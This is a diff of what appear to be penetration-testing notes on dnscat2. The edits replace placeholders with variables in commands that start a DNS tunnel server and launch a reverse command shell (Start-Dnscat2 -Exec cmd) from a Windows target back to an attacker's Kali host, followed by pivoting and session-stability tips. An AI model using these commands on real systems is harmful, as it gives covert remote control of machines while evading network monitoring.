@@ -31,11 +31,11 @@ cd ~/tools/tunneling/dnscat2/server && bundle install
 cd ~/tools/tunneling/dnscat2/server
 # --dns: bind/listen params for the DNS server
 # --no-cache: required to prevent stale session issues (always include)
-sudo ruby dnscat2.rb --dns "host=0.0.0.0,port=53,domain=<your-domain>" --no-cache
+sudo ruby dnscat2.rb --dns "host=0.0.0.0,port=53,domain=$Domain" --no-cache
 
 # On the Windows target (PowerShell):
 Import-Module .\dnscat2.ps1
-Start-Dnscat2 -DNSserver <KALI_IP> -Domain <your-domain> -PreSharedSecret <secret> -Exec cmd
+Start-Dnscat2 -DNSserver $LocalIP -Domain $Domain -PreSharedSecret <secret> -Exec cmd
 
 # Back in the dnscat2 server console:
 # List sessions:
@@ -94,7 +94,7 @@ ssh -fNL 4141:127.0.0.1:4141 kali@<felineauthority-ip>
 ## Session Stability Caveats
 
 - **20-attempt timeout:** client drops after ~20 consecutive DNS queries with no valid server response. Act immediately when the session connects, `window -i 1` then `listen` in one go.
-- **Systemd-resolved caching** on Ubuntu pivots can cause stale responses. Use `--dns server=<resolver>,port=53,domain=<domain>` to bypass the local stub resolver.
+- **Systemd-resolved caching** on Ubuntu pivots can cause stale responses. Use `--dns server=<resolver>,port=53,domain=$Domain` to bypass the local stub resolver.
 - **Multiple terminals:** keep the dnscat2 server terminal and the pivot SSH terminal completely separate. Typing pivot commands into the dnscat2 server prompt silently sends them as dnscat2 commands (which fail with "Unknown command").
 - Sessions are slow by nature. After `listen`, wait up to 60 seconds for data to flow through before concluding it's broken.
 
